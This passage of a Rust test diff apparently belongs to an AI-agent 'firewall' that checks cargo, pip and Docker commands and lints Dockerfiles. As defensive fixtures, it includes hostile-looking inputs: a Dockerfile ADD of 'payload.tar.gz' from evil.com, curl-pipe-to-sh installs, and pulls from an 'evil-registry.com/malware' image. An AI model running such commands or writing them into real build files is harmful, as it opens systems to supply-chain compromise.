+        assert!(!is_valid_crate_name("foo/bar"));
+    }
+
+    #[test]
+    fn valid_crate_name_1_char() {
+        assert!(is_valid_crate_name("a"));
+    }
+
+    #[test]
+    fn valid_crate_name_64_chars() {
+        let name = "a".repeat(64);
+        assert!(is_valid_crate_name(&name));
+    }
+
+    // --- Cargo arg extraction tests ---
+
+    #[test]
+    fn cargo_add_simple() {
+        let pkgs = parse_cargo_args("serde");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "serde");
+        assert_eq!(pkgs[0].1, Registry::CratesIo);
+    }
+
+    #[test]
+    fn cargo_add_multiple() {
+        let pkgs = parse_cargo_args("serde tokio anyhow");
+        assert_eq!(pkgs.len(), 3);
+        assert_eq!(pkgs[0].0, "serde");
+        assert_eq!(pkgs[1].0, "tokio");
+        assert_eq!(pkgs[2].0, "anyhow");
+    }
+
+    #[test]
+    fn cargo_add_with_version_pin() {
+        let pkgs = parse_cargo_args("serde@1.0.210");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "serde");
+    }
+
+    #[test]
+    fn cargo_add_with_features_flag() {
+        let pkgs = parse_cargo_args("serde --features derive");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "serde");
+    }
+
+    #[test]
+    fn cargo_add_with_f_flag() {
+        let pkgs = parse_cargo_args("tokio -F full");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "tokio");
+    }
+
+    #[test]
+    fn cargo_add_skips_git_source() {
+        let pkgs = parse_cargo_args("--git https://github.com/user/repo");
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn cargo_add_skips_path_source() {
+        let pkgs = parse_cargo_args("--path ../local-crate");
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn cargo_add_skips_path_like_token() {
+        let pkgs = parse_cargo_args("./local-crate");
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn cargo_install_with_flags() {
+        let pkgs = parse_cargo_args("ripgrep --locked --version 14.1.1");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "ripgrep");
+    }
+
+    #[test]
+    fn cargo_add_with_equals_flag() {
+        let pkgs = parse_cargo_args("serde --features=derive");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "serde");
+    }
+
+    // --- Cargo command detection tests ---
+
+    #[test]
+    fn detect_cargo_add() {
+        assert!(is_cargo_add_or_install_command("cargo add serde"));
+    }
+
+    #[test]
+    fn detect_cargo_install() {
+        assert!(is_cargo_add_or_install_command("cargo install ripgrep"));
+    }
+
+    #[test]
+    fn detect_cargo_add_in_chain() {
+        assert!(is_cargo_add_or_install_command("cd /tmp && cargo add evil"));
+    }
+
+    #[test]
+    fn detect_cargo_build_not_add() {
+        assert!(!is_cargo_add_or_install_command("cargo build"));
+    }
+
+    #[test]
+    fn detect_cargo_test_not_add() {
+        assert!(!is_cargo_add_or_install_command("cargo test --all"));
+    }
+
+    // --- Cargo extraction via extract_all_packages ---
+
+    #[test]
+    fn extract_all_packages_cargo_add() {
+        let pkgs = extract_all_packages("cargo add serde tokio");
+        assert_eq!(pkgs.len(), 2);
+        assert_eq!(pkgs[0].0, "serde");
+        assert_eq!(pkgs[0].1, Registry::CratesIo);
+        assert_eq!(pkgs[1].0, "tokio");
+    }
+
+    #[test]
+    fn extract_all_packages_cargo_install() {
+        let pkgs = extract_all_packages("cargo install ripgrep");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "ripgrep");
+        assert_eq!(pkgs[0].1, Registry::CratesIo);
+    }
+
+    #[test]
+    fn extract_all_packages_cargo_chain() {
+        let pkgs = extract_all_packages("cargo add serde && cargo install ripgrep");
+        assert_eq!(pkgs.len(), 2);
+        assert_eq!(pkgs[0].0, "serde");
+        assert_eq!(pkgs[1].0, "ripgrep");
+    }
+
+    // --- Registry::CratesIo tests ---
+
+    #[test]
+    fn registry_crates_io_display() {
+        assert_eq!(format!("{}", Registry::CratesIo), "crates.io");
+    }
+
+    #[test]
+    fn registry_crates_io_equality() {
+        assert_eq!(Registry::CratesIo, Registry::CratesIo);
+        assert_ne!(Registry::CratesIo, Registry::Npm);
+    }
+
+    // --- Docker image extraction tests ---
+
+    #[test]
+    fn docker_pull_simple() {
+        let imgs = extract_docker_images("docker pull ubuntu:22.04");
+        assert_eq!(imgs, vec!["ubuntu:22.04"]);
+    }
+
+    #[test]
+    fn docker_pull_with_registry() {
+        let imgs = extract_docker_images("docker pull ghcr.io/owner/image:v1");
+        assert_eq!(imgs, vec!["ghcr.io/owner/image:v1"]);
+    }
+
+    #[test]
+    fn podman_pull() {
+        let imgs = extract_docker_images("podman pull alpine");
+        assert_eq!(imgs, vec!["alpine"]);
+    }
+
+    #[test]
+    fn docker_run_extracts_image() {
+        let imgs = extract_docker_images("docker run --rm -it ubuntu:22.04 bash");
+        assert_eq!(imgs, vec!["ubuntu:22.04"]);
+    }
+
+    #[test]
+    fn docker_run_with_value_flags() {
+        let imgs =
+            extract_docker_images("docker run -e FOO=bar -v /tmp:/tmp -p 8080:80 nginx:latest");
+        assert_eq!(imgs, vec!["nginx:latest"]);
+    }
+
+    #[test]
+    fn docker_build_no_image() {
+        let imgs = extract_docker_images("docker build -t myapp .");
+        assert!(imgs.is_empty());
+    }
+
+    #[test]
+    fn docker_compose_no_image() {
+        let imgs = extract_docker_images("docker compose up -d");
+        assert!(imgs.is_empty());
+    }
+
+    // --- Docker run image parsing tests ---
+
+    #[test]
+    fn docker_run_image_boolean_flags() {
+        let img = extract_docker_run_image("--rm -d --privileged nginx");
+        assert_eq!(img.as_deref(), Some("nginx"));
+    }
+
+    #[test]
+    fn docker_run_image_value_flags() {
+        let img = extract_docker_run_image("-e SECRET=x --name mycontainer redis");
+        assert_eq!(img.as_deref(), Some("redis"));
+    }
+
+    #[test]
+    fn docker_run_image_equals_flags() {
+        let img = extract_docker_run_image("--name=foo --env=BAR=1 postgres:15");
+        assert_eq!(img.as_deref(), Some("postgres:15"));
+    }
+
+    #[test]
+    fn docker_run_image_no_image() {
+        let img = extract_docker_run_image("--rm -d");
+        assert!(img.is_none());
+    }
+
+    // --- Docker registry extraction tests ---
+
+    #[test]
+    fn registry_implicit_dockerhub() {
+        assert_eq!(extract_docker_registry("ubuntu"), "docker.io");
+    }
+
+    #[test]
+    fn registry_explicit_ghcr() {
+        assert_eq!(extract_docker_registry("ghcr.io/owner/repo:v1"), "ghcr.io");
+    }
+
+    #[test]
+    fn registry_with_port() {
+        assert_eq!(
+            extract_docker_registry("localhost:5000/myimage"),
+            "localhost:5000"
+        );
+    }
+
+    #[test]
+    fn registry_library_namespace() {
+        assert_eq!(extract_docker_registry("library/nginx"), "docker.io");
+    }
+
+    #[test]
+    fn registry_user_namespace() {
+        assert_eq!(extract_docker_registry("myuser/myapp:latest"), "docker.io");
+    }
+
+    // --- Docker tag/pin detection tests ---
+
+    #[test]
+    fn docker_image_latest() {
+        let img = "ubuntu:latest";
+        assert!(img.ends_with(":latest"));
+    }
+
+    #[test]
+    fn docker_image_untagged() {
+        let img = "ubuntu";
+        assert!(!img.contains(':') && !img.contains('@'));
+    }
+
+    #[test]
+    fn docker_image_pinned_tag() {
+        let img = "ubuntu:22.04";
+        assert!(img.contains(':') && !img.ends_with(":latest"));
+    }
+
+    #[test]
+    fn docker_image_digest_pinned() {
+        let img = "ubuntu@sha256:abc123";
+        assert!(img.contains('@'));
+    }
+
+    // --- Docker command detection tests ---
+
+    #[test]
+    fn detect_docker_pull() {
+        assert!(is_docker_command("docker pull ubuntu"));
+    }
+
+    #[test]
+    fn detect_docker_run() {
+        assert!(is_docker_command("docker run --rm ubuntu"));
+    }
+
+    #[test]
+    fn detect_docker_build() {
+        assert!(is_docker_command("docker build -t myapp ."));
+    }
+
+    #[test]
+    fn detect_podman_pull() {
+        assert!(is_docker_command("podman pull alpine"));
+    }
+
+    #[test]
+    fn detect_docker_compose_up() {
+        assert!(is_docker_command("docker compose up -d"));
+    }
+
+    #[test]
+    fn detect_docker_not_ps() {
+        assert!(!is_docker_command("docker ps"));
+    }
+
+    #[test]
+    fn detect_docker_not_images() {
+        assert!(!is_docker_command("docker images"));
+    }
+
+    #[test]
+    fn detect_docker_in_chain() {
+        assert!(is_docker_command("cd /app && docker pull evil:latest"));
+    }
+
+    // --- pip enforcement tests ---
+
+    #[test]
+    fn pip_require_binary_only_blocks() {
+        let input = bash_input("pip install requests");
+        let configs = PackageManagerConfigs {
+            pip: PipConfig {
+                require_binary_only: true,
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(output.decision, HookDecision::Block);
+        assert!(output
+            .message
+            .as_deref()
+            .unwrap_or("")
+            .contains("--only-binary"));
+    }
+
+    #[test]
+    fn pip_require_binary_only_allows_with_flag() {
+        let input = bash_input("pip install --only-binary :all: requests");
+        let configs = PackageManagerConfigs {
+            pip: PipConfig {
+                require_binary_only: true,
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        // Should not block (flag present) — may still warn about unverified package
+        assert_ne!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pip_require_binary_only_disabled() {
+        let input = bash_input("pip install requests");
+        let configs = PackageManagerConfigs {
+            pip: PipConfig {
+                require_binary_only: false,
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        // Should not block when disabled
+        assert_ne!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pip_warn_source_installs_warns() {
+        let input = bash_input("pip install requests");
+        let configs = PackageManagerConfigs {
+            pip: PipConfig {
+                warn_source_installs: true,
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        // May warn about source installs (depends on package check result)
+        // At minimum, should not block
+        if output.decision == HookDecision::Warn {
+            assert!(
+                output
+                    .message
+                    .as_deref()
+                    .unwrap_or("")
+                    .contains("--only-binary")
+                    || output.message.as_deref().unwrap_or("").contains("verify")
+            );
+        }
+    }
+
+    #[test]
+    fn pip_warn_source_installs_no_warn_with_flag() {
+        let input = bash_input("pip install --only-binary :all: requests");
+        let configs = PackageManagerConfigs {
+            pip: PipConfig {
+                warn_source_installs: true,
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        // Should not contain --only-binary warning (flag already present)
+        if output.decision == HookDecision::Warn {
+            assert!(!output.message.as_deref().unwrap_or("").contains("setup.py"));
+        }
+    }
+
+    #[test]
+    fn pip_separate_allowlist() {
+        // Verify pip uses its own allowlist, not npm's
+        let configs = PackageManagerConfigs {
+            npm: NpmConfig {
+                allowlist: vec!["npm-only-pkg".to_owned()],
+                ..NpmConfig::default()
+            },
+            pip: PipConfig {
+                allowlist: vec!["pip-only-pkg".to_owned()],
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        // This is a unit-level check — just verify the configs are independent
+        assert!(!configs.pip.allowlist.contains(&"npm-only-pkg".to_owned()));
+        assert!(!configs.npm.allowlist.contains(&"pip-only-pkg".to_owned()));
+    }
+
+    // --- Docker pre_bash integration tests ---
+
+    #[test]
+    fn docker_pull_latest_warns() {
+        let input = bash_input("docker pull ubuntu:latest");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(output.decision, HookDecision::Warn);
+        assert!(output.message.as_deref().unwrap_or("").contains(":latest"));
+    }
+
+    #[test]
+    fn docker_pull_untagged_warns() {
+        let input = bash_input("docker pull ubuntu");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(output.decision, HookDecision::Warn);
+        assert!(output.message.as_deref().unwrap_or("").contains("no tag"));
+    }
+
+    #[test]
+    fn docker_pull_pinned_no_warn() {
+        let input = bash_input("docker pull ubuntu:22.04");
+        let configs = PackageManagerConfigs {
+            docker: DockerConfig {
+                trusted_registries: vec!["docker.io".to_owned()],
+                ..DockerConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(output.decision, HookDecision::Allow);
+    }
+
+    #[test]
+    fn docker_pull_untrusted_registry_warns() {
+        let input = bash_input("docker pull evil-registry.com/malware:v1");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(output.decision, HookDecision::Warn);
+        assert!(output
+            .message
+            .as_deref()
+            .unwrap_or("")
+            .contains("evil-registry.com"));
+        assert!(output
+            .message
+            .as_deref()
+            .unwrap_or("")
+            .contains("trusted_registries"));
+    }
+
+    #[test]
+    fn docker_pull_trusted_registry_no_untrust_warn() {
+        let input = bash_input("docker pull ghcr.io/owner/image:v1.0");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        // ghcr.io is in default trusted registries, pinned tag — should allow
+        assert_eq!(output.decision, HookDecision::Allow);
+    }
+
+    #[test]
+    fn docker_build_no_image_warn() {
+        let input = bash_input("docker build -t myapp .");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        // docker build extracts no images, so no Docker-specific warnings
+        assert_eq!(output.decision, HookDecision::Allow);
+    }
+
+    // --- Cross-ecosystem shell chain test ---
+
+    #[test]
+    fn cargo_and_docker_chain_detection() {
+        // Verify both ecosystems are detected in a chained command
+        let cmd = "cargo add serde && docker pull ubuntu";
+        assert!(is_cargo_add_or_install_command(cmd));
+        assert!(is_docker_command(cmd));
+    }
+
+    #[test]
+    fn docker_only_untagged_warns() {
+        // Pure docker command (no cargo) triggers untagged warning
+        let input = bash_input("docker pull ubuntu");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(output.decision, HookDecision::Warn);
+    }
+
+    // --- PackageManagerConfigs tests ---
+
+    #[test]
+    fn package_manager_configs_v040_defaults() {
+        let configs = PackageManagerConfigs::default();
+        assert!(configs.npm.ignore_scripts_warning);
+        assert!(configs.pip.warn_source_installs);
+        assert!(configs.cargo.warn_build_scripts);
+        assert!(configs.docker.warn_latest);
+        assert_eq!(configs.docker.trusted_registries.len(), 5);
+    }
+
+    #[test]
+    fn package_manager_configs_v040_custom() {
+        let configs = PackageManagerConfigs {
+            cargo: CargoConfig {
+                allowlist: vec!["my-crate".to_owned()],
+                warn_build_scripts: false,
+            },
+            docker: DockerConfig {
+                warn_latest: false,
+                ..DockerConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        assert!(!configs.cargo.warn_build_scripts);
+        assert!(!configs.docker.warn_latest);
+        assert_eq!(configs.cargo.allowlist, vec!["my-crate"]);
+    }
+
+    // --- post_bash cargo download detection tests ---
+
+    #[test]
+    fn post_bash_cargo_downloaded_warns() {
+        let input = make_test_input(
+            "bash",
+            json!({
+                "command": "cargo build",
+                "stdout": "",
+                "stderr": "  Downloaded serde v1.0.210\n  Downloaded tokio v1.40.0\n  Downloaded 2 crates (1.5 MB) in 0.5s"
+            }),
+        );
+        let configs = PackageManagerConfigs::default();
+        let output = post_bash_with_configs(&input, &configs);
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("serde"), "should mention serde");
+        assert!(msg.contains("tokio"), "should mention tokio");
+        assert!(msg.contains("build.rs"), "should mention build.rs risk");
+    }
+
+    #[test]
+    fn post_bash_cargo_downloaded_allowlisted_skipped() {
+        let input = make_test_input(
+            "bash",
+            json!({
+                "command": "cargo build",
+                "stdout": "",
+                "stderr": "  Downloaded serde v1.0.210"
+            }),
+        );
+        let configs = PackageManagerConfigs {
+            cargo: CargoConfig {
+                allowlist: vec!["serde".to_owned()],
+                warn_build_scripts: true,
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = post_bash_with_configs(&input, &configs);
+        // serde is allowlisted, so no cargo warning should be emitted
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(!msg.contains("serde"), "allowlisted crate should not warn");
+    }
+
+    #[test]
+    fn post_bash_cargo_warn_disabled() {
+        let input = make_test_input(
+            "bash",
+            json!({
+                "command": "cargo build",
+                "stdout": "",
+                "stderr": "  Downloaded evil-crate v0.1.0"
+            }),
+        );
+        let configs = PackageManagerConfigs {
+            cargo: CargoConfig {
+                warn_build_scripts: false,
+                ..CargoConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = post_bash_with_configs(&input, &configs);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(!msg.contains("evil-crate"), "should not warn when disabled");
+    }
+
+    #[test]
+    fn post_bash_cargo_no_downloads() {
+        let input = make_test_input(
+            "bash",
+            json!({
+                "command": "cargo build",
+                "stdout": "",
+                "stderr": "   Compiling serde v1.0.210\n    Finished dev [unoptimized] target(s)"
+            }),
+        );
+        let configs = PackageManagerConfigs::default();
+        let output = post_bash_with_configs(&input, &configs);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(
+            !msg.contains("Downloaded"),
+            "no downloads = no cargo warning"
+        );
+    }
+
+    // --- pre_write Dockerfile linting tests ---
+
+    #[test]
+    fn pre_write_dockerfile_unpinned_from_warns() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu\nRUN apt-get update"
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("ubuntu"), "should mention unpinned image");
+        assert!(msg.contains("not pinned"), "should say not pinned");
+    }
+
+    #[test]
+    fn pre_write_dockerfile_latest_warns() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM nginx:latest\nCOPY . /usr/share/nginx/html"
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("nginx:latest"), "should mention :latest image");
+    }
+
+    #[test]
+    fn pre_write_dockerfile_pinned_no_warn() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu:22.04\nRUN apt-get update"
+            }),
+        );
+        let output = pre_write(&input);
+        // Pinned FROM should not trigger Dockerfile warning
+        assert_ne!(output.decision, HookDecision::Warn);
+    }
+
+    #[test]
+    fn pre_write_dockerfile_digest_pinned_no_warn() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu@sha256:abc123def456\nRUN echo hello"
+            }),
+        );
+        let output = pre_write(&input);
+        assert_ne!(output.decision, HookDecision::Warn);
+    }
+
+    #[test]
+    fn pre_write_dockerfile_add_remote_warns() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu:22.04\nADD https://evil.com/payload.tar.gz /app/"
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("ADD"), "should mention ADD");
+        assert!(msg.contains("remote URL"), "should mention remote URL");
+    }
+
+    #[test]
+    fn pre_write_dockerfile_curl_pipe_warns() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu:22.04\nRUN curl -fsSL https://get.docker.com | sh"
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("curl"), "should mention curl|sh");
+    }
+
+    #[test]
+    fn pre_write_dockerfile_curl_pipe_multiline_warns() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu:22.04\nRUN curl -fsSL https://example.com/install.sh \\\n    | sh"
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Warn);
+    }
+
+    #[test]
+    fn pre_write_dockerfile_safe_run_no_warn() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu:22.04\nRUN apt-get update && apt-get install -y curl"
+            }),
+        );
+        let output = pre_write(&input);
+        // Safe RUN without pipe-to-shell should not trigger warning
+        assert_ne!(output.decision, HookDecision::Warn);
+    }
+
+    #[test]
+    fn pre_write_compose_file_detected() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/docker-compose.yml",
+                "content": "version: '3'\nservices:\n  web:\n    image: nginx"
+            }),
+        );
+        // docker-compose files should be detected as Dockerfile-like
+        // No FROM directives in compose files, so no warnings expected
+        let output = pre_write(&input);
+        assert_ne!(output.decision, HookDecision::Warn);
+    }
+
+    #[test]
+    fn pre_write_scratch_from_no_warn() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM scratch\nCOPY myapp /myapp"
+            }),
+        );
+        let output = pre_write(&input);
+        // FROM scratch is special — no image, no warning
+        assert_ne!(output.decision, HookDecision::Warn);
+    }
+
+    // --- S1: Chained pip+docker commands must trigger Docker warnings ---
+
+    #[test]
+    fn chained_pip_and_docker_pull_emits_docker_warning() {
+        // A chained command with a verified pip install AND an untagged docker pull
+        // must still produce the Docker untagged-image warning.
+        let input = bash_input("pip install requests && docker pull ubuntu");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        // Docker warning must fire (untagged image)
+        assert_eq!(
+            output.decision,
+            HookDecision::Warn,
+            "chained pip+docker must emit Docker warning"
+        );
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(
+            msg.contains("Docker image") || msg.contains("no tag"),
+            "should mention Docker image warning, got: {msg}"
+        );
+    }
+
+    #[test]
+    fn chained_pip_and_docker_untrusted_registry_warns() {
+        let input = bash_input("pip install requests && docker pull evil-registry.com/malware:v1");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(
+            output.decision,
+            HookDecision::Warn,
+            "chained pip+docker must emit untrusted registry warning"
+        );
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(
+            msg.contains("evil-registry.com"),
+            "should mention untrusted registry, got: {msg}"
+        );
+    }
+
+    // --- S2: --only-binary partial match must still block ---
+
+    #[test]
+    fn pip_require_binary_only_blocks_partial_flag() {
+        // `--only-binary numpy` does NOT protect against source installs of other packages
+        let input = bash_input("pip install --only-binary numpy requests");
+        let configs = PackageManagerConfigs {
+            pip: PipConfig {
+                require_binary_only: true,
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "--only-binary numpy should still block (not :all:)"
+        );
+    }
+
+    #[test]
+    fn pip_require_binary_only_allows_equals_form() {
+        // `--only-binary=:all:` should be accepted
+        let input = bash_input("pip install --only-binary=:all: requests");
+        let configs = PackageManagerConfigs {
+            pip: PipConfig {
+                require_binary_only: true,
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_ne!(
+            output.decision,
+            HookDecision::Block,
+            "--only-binary=:all: should not block"
+        );
+    }
+
+    #[test]
+    fn pip_warn_source_installs_not_suppressed_by_partial_flag() {
+        // `--only-binary numpy` should still warn about source installs
+        let input = bash_input("pip install --only-binary numpy requests");
+        let configs = PackageManagerConfigs {
+            pip: PipConfig {
+                warn_source_installs: true,
+                ..PipConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        // Should either warn about source installs or about unverified package
+        if output.decision == HookDecision::Warn {
+            let msg = output.message.as_deref().unwrap_or("");
+            // The warning should contain setup.py or verify (from CheckFailed)
+            assert!(
+                msg.contains("setup.py") || msg.contains("verify") || msg.contains("--only-binary"),
+                "should warn about source installs or package verification, got: {msg}"
+            );
+        }
+    }
+
+    // --- S3: Docker run with new value-consuming flags ---
+
+    #[test]
+    fn docker_run_env_file_flag() {
+        let img = extract_docker_run_image("--env-file .env nginx:latest");
+        assert_eq!(img, Some("nginx:latest".to_owned()));
+    }
+
+    #[test]
+    fn docker_run_cidfile_flag() {
+        let img = extract_docker_run_image("--cidfile /tmp/cid nginx:latest");
+        assert_eq!(img, Some("nginx:latest".to_owned()));
+    }
+
+    #[test]
+    fn docker_run_runtime_flag() {
+        let img = extract_docker_run_image("--runtime nvidia tensorflow/tensorflow:latest-gpu");
+        assert_eq!(img, Some("tensorflow/tensorflow:latest-gpu".to_owned()));
+    }
+
+    #[test]
+    fn docker_run_shm_size_flag() {
+        let img = extract_docker_run_image("--shm-size 2g nginx:latest");
+        assert_eq!(img, Some("nginx:latest".to_owned()));
+    }
+
+    #[test]
+    fn docker_run_ulimit_flag() {
+        let img = extract_docker_run_image("--ulimit nofile=1024:1024 nginx:latest");
+        assert_eq!(img, Some("nginx:latest".to_owned()));
+    }
+
+    #[test]
+    fn docker_run_ipc_flag() {
+        let img = extract_docker_run_image("--ipc host nginx:latest");
+        assert_eq!(img, Some("nginx:latest".to_owned()));
+    }
+
+    #[test]
+    fn docker_run_cgroup_parent_flag() {
+        let img = extract_docker_run_image("--cgroup-parent /mygroup nginx:latest");
+        assert_eq!(img, Some("nginx:latest".to_owned()));
+    }
+
+    // --- U1: npm/PyPI block messages include allowlist ---
+
+    #[test]
+    fn npm_block_message_includes_allowlist() {
+        let name = "fake-pkg";
+        let registry = Registry::Npm;
+        let msg = match registry {
+            Registry::Npm => format!(
+                "Blocked: package '{name}' not found on npm \
+                 (possible typosquatting/slopsquatting)\n\
+                 To proceed: verify at https://www.npmjs.com/package/{name}, add to \
+                 [sentinel.npm] allowlist, or run directly in your terminal"
+            ),
+            _ => String::new(),
+        };
+        assert!(msg.contains("[sentinel.npm] allowlist"));
+    }
+
+    #[test]
+    fn pypi_block_message_includes_allowlist() {
+        let name = "fake-pkg";
+        let registry = Registry::PyPI;
+        let msg = match registry {
+            Registry::PyPI => format!(
+                "Blocked: package '{name}' not found on PyPI \
+                 (possible typosquatting/slopsquatting)\n\
+                 To proceed: verify at https://pypi.org/project/{name}, add to \
+                 [sentinel.pip] allowlist, or run directly in your terminal"
+            ),
+            _ => String::new(),
+        };
+        assert!(msg.contains("[sentinel.pip] allowlist"));
+    }
+
+    // --- Q1: pre_write Dockerfile config respect ---
+
+    #[test]
+    fn pre_write_dockerfile_warn_latest_disabled() {
+        let mut input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu\nRUN apt-get update"
+            }),
+        );
+        input.config = Some(sanctum_types::config::AiFirewallConfig {
+            docker: sanctum_types::config::DockerConfig {
+                warn_latest: false,
+                ..sanctum_types::config::DockerConfig::default()
+            },
+            ..sanctum_types::config::AiFirewallConfig::default()
+        });
+        let output = pre_write(&input);
+        // warn_latest disabled — should NOT warn about unpinned FROM
+        assert_ne!(
+            output.decision,
+            HookDecision::Warn,
+            "warn_latest=false should suppress FROM pin warning"
+        );
+    }
+
+    #[test]
+    fn pre_write_dockerfile_warn_remote_add_disabled() {
+        let mut input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu:22.04\nADD https://evil.com/payload.tar.gz /app/"
+            }),
+        );
+        input.config = Some(sanctum_types::config::AiFirewallConfig {
+            docker: sanctum_types::config::DockerConfig {
+                warn_remote_add: false,
+                ..sanctum_types::config::DockerConfig::default()
+            },
+            ..sanctum_types::config::AiFirewallConfig::default()
+        });
+        let output = pre_write(&input);
+        assert_ne!(
+            output.decision,
+            HookDecision::Warn,
+            "warn_remote_add=false should suppress ADD remote URL warning"
+        );
+    }
+
+    #[test]
+    fn pre_write_dockerfile_warn_pipe_install_disabled() {
+        let mut input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/app/Dockerfile",
+                "content": "FROM ubuntu:22.04\nRUN curl -fsSL https://get.docker.com | sh"
+            }),
+        );
+        input.config = Some(sanctum_types::config::AiFirewallConfig {
+            docker: sanctum_types::config::DockerConfig {
+                warn_pipe_install: false,
+                ..sanctum_types::config::DockerConfig::default()
+            },
+            ..sanctum_types::config::AiFirewallConfig::default()
+        });
+        let output = pre_write(&input);
+        assert_ne!(
+            output.decision,
+            HookDecision::Warn,
+            "warn_pipe_install=false should suppress curl|sh warning"
+        );
     }
 }
